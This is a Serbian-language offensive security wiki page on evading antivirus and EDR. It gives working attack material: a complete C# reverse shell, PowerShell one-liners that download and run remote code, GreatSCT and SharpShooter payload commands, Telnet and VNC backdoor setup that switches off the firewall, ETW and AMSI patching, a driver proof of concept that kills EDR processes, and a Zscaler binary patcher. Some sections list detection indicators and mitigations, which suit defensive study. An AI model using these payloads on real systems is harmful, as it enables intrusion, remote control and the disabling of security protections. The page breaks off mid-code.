Ovaj niz koraka obnavlja tok izvršavanja **bez** pokretanja zlonamernog uzorka – korisno pri radu na radnoj stanici van mreže.

> 🛈  ConfuserEx generiše prilagođeni atribut pod nazivom `ConfusedByAttribute`, koji može da se koristi kao IOC za automatsku trijažu uzoraka.

#### Jednolinijska komanda
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork LLVM kompilacionog paketa koji omogućava veću bezbednost softvera putem [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštite od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako se jezik `C++11/14` može koristiti za generisanje obfuskovanog koda tokom kompajliranja, bez korišćenja eksternih alata i bez izmena kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija generisanih pomoću C++ template metaprogramming okvira, što osobi koja želi da razbije aplikaciju dodatno otežava posao.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuskuje različite PE fajlove, uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan engine za metamorfni kod za proizvoljne izvršne fajlove.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je framework za detaljnu obfuskaciju koda za jezike koje podržava LLVM, uz korišćenje ROP-a (return-oriented programming). ROPfuscator obfuskuje program na nivou assembly koda tako što obične instrukcije pretvara u ROP lance, čime narušava naše uobičajeno shvatanje normalnog toka kontrole.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim-u
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL fajlove u shellcode, a zatim da ih učita

### LLVM compiler-assisted per-function self-masking

Umesto da se ceo implant maskira samo dok miruje, izmenjeni LLVM X86 backend može da održava odabrane funkcije XOR-maskiranim kad god nisu aktivne. Function Peekaboo PoC bira demanglovana imena koja sadrže `REG_`, ubacuje position-independent ulazne/izlazne stubove oko završnog mašinskog koda i emituje jedan zajednički masking handler u `.text`; potpisi na nivou izvornog koda i Windows x64 calling convention ostaju nepromenjeni.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Ovo treba da se uradi nakon izbora instrukcija i optimizacije, jer transformacija mora da obuhvati **svaki emitovani return** i da zna tačan x86 raspored. `MachineFunctionPass` pre emitovanja pronalazi poslednji `MachineInstr::isReturn()`, briše ga tako da se završna putanja nastavlja u dodatni epilogue, a ranije return instrukcije zamenjuje sa `JMP_1 handler`. Sačuvajte svako uklanjanje steka/okvira koje je generisao kompajler pre svakog return-a; preusmerite samo return instrukciju.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `emitFunctionBodyEnd()` emituju stubove za svaku funkciju, dok `emitEndOfAsmFile()` emituje handler. Simboli koje dele faze emitovanja omogućavaju da prologue grana cilja kasniji epilogue; za ručno emitovani near `je` upišite `0F 84`, a zatim četvorobajtni MC izraz `target - address_after_je`. Pozivi i skokovi do handler-a mogu se umesto toga emitovati kao `MCInst` objekti (`CALL64pcrel32` i `JMP_1`). Pass mora da vrati `false` za neizabranu funkciju ako nije ništa promenio; PoC pogrešno vraća `true` u tom slučaju.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC smešta XOR ključ i zapise od 16 bajtova koji sadrže pokazivač na funkciju koji je relocirao loader, kao i dužinu za vreme izvršavanja, u `.funcmeta`. Iako je C polje `uint32_t`, handler pristupa QWORD-u na pomeraju `+8` u zapisu, čime obuhvata dužinu i njeno poravnanje, a zapise pomera za `0x10`. Imena PE sekcija imaju samo osam bajtova, pa pretraga tokom izvršavanja vidi `.funcmet`. Eksterni patcher dodaje izvršni `.stub`, čuva stari RVA entry point-a u stub-u i preusmerava `AddressOfEntryPoint`; PIC stub dobija image base iz `gs:[0x60]` → `[PEB+0x10]`, prolazi kroz PE32+ imports da bi razrešio već importovani `VirtualProtect` i pokreće se pre CRT-a.<sup>[[38]](#references)[[39]](#references)</sup>

Inicijalizacija postavlja sentinel u `gs:[0xE8]` i poziva svaku funkciju iz metadata-e. Njena trajno čitljiva prologue beleži početak funkcije u `gs:[0xF0]`, detektuje sentinel i preskače telo koje još nije maskirano. Zatim epilogue koristi `call handler`; nakon što handler sačuva 13 registara (`0x68` bajtova), povratna adresa na `[rsp+0x68]` predstavlja kraj transformisane funkcije, pa se `end - start` može upisati u njen metadata zapis. Stub briše sentinel i skače na `ImageBase + original_entry_point_RVA` nakon maskiranja svih tela.<sup>[[38]](#references)[[39]](#references)</sup>

Tokom normalnog poziva, prologue poziva isti simetrični handler da bi dekodirao telo. Završna putanja nastavlja se u dodatni epilogue, dok svaka ranija return instrukcija skače direktno do zajedničkog handler-a. Uobičajeni epilogue takođe koristi `jmp handler` umesto `call`, pa nakon ponovnog maskiranja `ret` iz handler-a troši povratnu adresu prvobitnog pozivaoca i čuva rezultat funkcije u `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler pronalazi trenutni zapis, preskače fiksni vidljivi prologue (`0x46` bajtova u ovoj verziji), menja ostatak u `PAGE_EXECUTE_READWRITE`, XOR-uje svaki bajt niskim bajtom ključa, a zatim ga postavlja na `PAGE_EXECUTE_READ`. Ista petlja zato dekodira pri ulasku i kodira pri svakom uobičajenom izlasku.<sup>[[38]](#references)[[39]](#references)</sup>

Indikatori koji snažno ukazuju na ovaj dizajn uključuju:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point unutar izvršnog `.stub`-a i sekciju `.funcmet` koja sadrži ključ i relocirane pokazivače na `.text`;
- pre-CRT parsiranje PEB-a, import tabele i tabele sekcija, praćeno pozivima preko svakog metadata pokazivača;
- identične PIC prologue instrukcije `call`/`pop` i mnoga return mesta preusmerena na jedan handler;
- upise u `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, praćene ponovljenim `VirtualProtect` promenama zaštite i bajt-po-bajt XOR upisima u izvršne stranice koje podržava image.

Ovo je izbegavanje memory scanner-a, a ne kriptografska zaštita: zakrpljeni fajl i dalje sadrži originalno, nemaskirano telo, a debugger može da postavi breakpoint na `VirtualProtect` ili XOR petlju i preuzme aktivnu funkciju. Jednobajtni XOR, čitljiva metadata i fiksna granica `0x46` takođe omogućavaju jednostavnu offline rekonstrukciju.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slotovi u PoC-u su thread-local, ali izmenjene stranice koda važe za ceo proces. Istovremeni ili rekurzivni ulasci zato mogu ponovo da preokrenu instrukcije dok se druga invokacija izvršava; izuzeci i nen lokalni izlasci takođe mogu da zaobiđu ponovno maskiranje. Robusna implementacija mora da sinhronizuje promene, vrati zaštitu koja je zaista zabeležena preko `lpflOldProtect`, izbegava hardkodirane dužine stub-ova, proveri poravnanje steka za x64 na putanjama `call` i `jmp`, i pozove `FlushInstructionCache` nakon izmene izvršnih bajtova. Microsoft izričito navodi da je pozivalac odgovoran za koherentnost keša instrukcija kada se izvršni kod menja.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih fajlova sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom koristi pristup zasnovan na reputaciji, što znači da će preuzimanje neuobičajenih aplikacija pokrenuti SmartScreen, koji će upozoriti krajnjeg korisnika i sprečiti ga da pokrene fajl (iako se fajl i dalje može pokrenuti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) nazvan Zone.Identifier, koji se automatski kreira pri preuzimanju fajlova sa interneta, zajedno sa URL-om sa kojeg je fajl preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani **pouzdanim** potpisnim sertifikatom **neće pokrenuti SmartScreen**.

Veoma efikasan način da sprečite da vaši payload-i dobiju Mark of The Web jeste da ih zapakujete u neki kontejner, kao što je ISO. To je zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na volumene koji **nisu NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Primer upotrebe:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-a u ISO datoteke pomoću [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za evidentiranje u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **beleže događaje**. Međutim, sigurnosni proizvodi ga mogu koristiti i za nadgledanje i otkrivanje zlonamernih aktivnosti.

Slično onemogućavanju (zaobilaženju) AMSI-ja, moguće je podesiti i da funkcija **`EtwEventWrite`** procesa u korisničkom prostoru odmah vrati kontrolu bez beleženja događaja. To se radi zakrpom funkcije u memoriji tako da odmah vrati kontrolu, čime se efektivno onemogućava ETW evidentiranje za taj proces.

Više informacija možete pronaći na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju poznato je već neko vreme i još uvek je veoma dobar način za pokretanje post-exploitation alata bez otkrivanja od strane AV-a.

Pošto će payload biti učitan direktno u memoriju, bez upisivanja na disk, trebaće nam samo da zakrpimo AMSI za ceo proces.

Većina C2 framework-ova (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već omogućava direktno izvršavanje C# assembly-ja u memoriji, ali to se može uraditi na različite načine:

- **Fork\&Run**

Ovo podrazumeva **pokretanje novog žrtvenog procesa**, ubrizgavanje zlonamernog post-exploitation koda u taj novi proces, izvršavanje koda i gašenje novog procesa po završetku. Ovaj pristup ima i prednosti i mane. Prednost fork and run metode je to što se izvršavanje odvija **izvan** našeg Beacon implant procesa. To znači da, ako nešto pođe po zlu tokom post-exploitation aktivnosti ili budemo otkriveni, postoji **mnogo veća šansa** da naš **implant preživi.** Mana je to što postoji **veća šansa** da nas otkriju **bihevioralni mehanizmi za detekciju**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ovde se zlonamerni post-exploitation kod ubrizgava **u sopstveni proces**. Tako možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali mana je to što, ako nešto pođe po zlu tokom izvršavanja payload-a, postoji **mnogo veća šansa** da **izgubite svoj beacon**, jer može doći do pada procesa.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da saznate više o učitavanju C# Assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assembly-je možete učitavati i **iz PowerShell-a**. Pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video S3cur3th1sSh1t-a](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), zlonamerni kod moguće je izvršavati i pomoću drugih jezika tako što se kompromitovanoj mašini omogući pristup **okruženju interpretera instaliranom na SMB deljenom resursu koji kontroliše napadač**.

Omogućavanjem pristupa binarnim datotekama interpretera i okruženju na SMB deljenom resursu možete **izvršavati proizvoljan kod napisan tim jezicima u memoriji** kompromitovane mašine.

U repozitorijumu se navodi: Defender i dalje skenira skripte, ali korišćenje Go, Java, PHP itd. pruža **veću fleksibilnost za zaobilaženje statičkih potpisa**. Testiranje nasumičnih, neobfuskiranih reverse shell skripti napisanih na tim jezicima pokazalo se uspešnim.

## TokenStomping

Token stomping manipuliše access token-om sigurnosnog proizvoda kao što su EDR ili AV. Smanjivanje privilegija token-a može ostaviti proces aktivnim, a istovremeno ga sprečiti da obavlja privilegovane inspekcije ili radnje sanacije.

Da bi se to sprečilo, Windows bi mogao da **spreči spoljne procese** da dobiju handle-ove nad token-ima sigurnosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje pouzdanog softvera

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je instalirati Chrome Remote Desktop na računar žrtve, a zatim ga koristiti za preuzimanje kontrole nad njim i održavanje persistence-a:<sup>[[35]](#references)</sup>
1. Preuzmite ga sa https://remotedesktop.google.com/, kliknite na „Set up via SSH“, a zatim kliknite na MSI datoteku za Windows da biste je preuzeli.
2. Pokrenite instalacioni program neprimetno na računaru žrtve (potrebna su administratorska prava): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop i kliknite na Next. Čarobnjak će zatražiti autorizaciju; kliknite na dugme Authorize da biste nastavili.
4. Izvršite dobijenu komandu uz potrebna podešavanja: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametar `--pin` postavlja PIN bez korišćenja GUI-ja).
 

## Napredno izbegavanje detekcije

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Izbegavanje detekcije je veoma složena tema; ponekad je potrebno uzeti u obzir mnogo različitih izvora telemetrije u jednom sistemu, pa je praktično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje na koje naiđete imaće svoje prednosti i slabosti.

Toplo vam preporučujem da pogledate ovo predavanje od [@ATTL4S](https://twitter.com/DaniLJ94) kako biste stekli osnovno znanje o naprednijim tehnikama izbegavanja detekcije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je još jedno odlično predavanje od [@mariuszbit](https://twitter.com/mariuszbit) o višeslojnom izbegavanju detekcije.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare tehnike**

### **Provera koji delovi Defender-u deluju zlonamerno**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binarne datoteke** dok **ne utvrdi koji deo Defender smatra zlonamernim**, a zatim će ga izdvojiti za vas.\
Još jedan alat koji radi **istu stvar** je [**avred**](https://github.com/dobin/avred), uz javno dostupnu web uslugu na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows 10, svi Windows sistemi su dolazili sa **Telnet server-om** koji ste mogli da instalirate (kao administrator) ovako:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Podesite da se **pokreće** pri pokretanju sistema i **pokrenite** ga sada:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Promenite telnet port (stealth) i onemogućite firewall:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam bin preuzimanja, a ne instalacija)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binarnu datoteku _**winvnc.exe**_ i **novokreiranu** datoteku _**UltraVNC.ini**_ na **žrtvu**

#### **Obrnuta veza**

**Napadač** treba da **pokrene na svom** **hostu** binarnu datoteku `vncviewer.exe -listen 5900`, kako bi bila **spremna** da prihvati obrnutu **VNC vezu**. Zatim, na **žrtvi**: Pokrenite winvnc daemon pomoću `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste ostali neprimećeni, nemojte raditi sledeće:

- Nemojte pokretati `winvnc` ako je već pokrenut jer ćete izazvati [iskačući prozor](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez datoteke `UltraVNC.ini` u istom direktorijumu jer će se otvoriti [prozor za podešavanje](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` radi pomoći jer ćete izazvati [iskačući prozor](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

U okviru GreatSCT-a:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sada **pokrenite lister** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Trenutni Defender će veoma brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Koristite ga uz:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# korišćenjem kompajlera

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Primer korišćenja pythona za izradu injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Uništavanje AV/EDR-a iz kernel prostora

Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući zaštitu krajnjih uređaja pre nego što postavi ransomware. Alat donosi **sopstveni ranjivi, ali *potpisani* driver** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje čak ni AV servisi zaštićeni pomoću Protected-Process-Light (PPL) ne mogu da blokiraju.<sup>[[12]](#references)</sup>

Ključne pouke
1. **Potpisani driver**: Datoteka koja se isporučuje na disk je `ServiceMouse.sys`, ali binarna datoteka je legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs alata „System In-Depth Analysis Toolkit“. Pošto driver ima važeći Microsoft potpis, učitava se čak i kada je uključena opcija Driver-Signature-Enforcement (DSE).
2. **Instalacija servisa**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Prva linija registruje driver kao **kernel servis**, a druga ga pokreće kako bi `\\.\ServiceMouse` postao dostupan iz korisničkog prostora.
3. **IOCTL-ovi koje driver izlaže**
   | IOCTL kod | Mogućnost                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Prekinuti proizvoljan proces pomoću PID-a (koristi se za zaustavljanje Defender/EDR servisa) |
   | `0x990000D0` | Obrisati proizvoljnu datoteku sa diska |
   | `0x990001D0` | Ukloniti driver i ukloniti servis |

   Minimalni C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi zaštite u korisničkom režimu; kod koji se izvršava u kernelu može da otvori *zaštićene* procese, prekine ih ili menja objekte kernela, bez obzira na PPL/PP, ELAM ili druge funkcije za ojačavanje bezbednosti.

Otkrivanje / ublažavanje rizika
•  Omogućite Microsoftovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) kako bi Windows odbio da učita `AToolsKrnl64.sys`.
•  Pratite kreiranje novih *kernel* servisa i generišite upozorenje kada se drajver učita iz direktorijuma sa dozvolama za pisanje za sve korisnike ili nije na listi dozvoljenih.
•  Pratite rukohvate iz korisničkog režima ka prilagođenim objektima uređaja, nakon kojih slede sumnjivi pozivi `DeviceIoControl`.

### Zaobilaženje provera stanja uređaja u Zscaler Client Connector-u izmenom binarnih datoteka na disku

Zscalerov **Client Connector** lokalno primenjuje pravila za stanje uređaja i oslanja se na Windows RPC za prosleđivanje rezultata drugim komponentama. Dva slaba izbora u dizajnu omogućavaju potpuno zaobilaženje:

1. Provera stanja uređaja obavlja se **u potpunosti na klijentskoj strani** (serveru se šalje logička vrednost).
2. Interne RPC krajnje tačke proveravaju samo da li je izvršna datoteka koja se povezuje **potpisana od strane Zscaler-a** (putem `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Izmenom četiri potpisane binarne datoteke na disku** moguće je neutralisati oba mehanizma:

| Binarna datoteka | Izmenjena originalna logika | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa svaka provera pokazuje usklađenost |
| `ZSAService.exe` | Indirektni poziv funkcije `WinVerifyTrust` | Zamenjen NOP instrukcijama ⇒ svaki proces (čak i nepotpisan) može da se poveže sa RPC cevima |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Preskočene |

Kratak izvod patcher-a:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

